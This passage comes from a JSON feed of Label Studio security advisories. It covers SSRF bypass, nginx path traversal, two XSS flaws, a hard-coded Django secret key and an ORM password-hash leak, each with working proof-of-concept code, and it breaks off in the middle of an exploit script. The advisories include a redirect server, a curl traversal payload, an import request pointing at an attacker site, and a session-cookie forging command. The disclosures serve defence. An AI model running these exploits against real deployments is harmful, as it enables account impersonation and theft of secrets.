below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                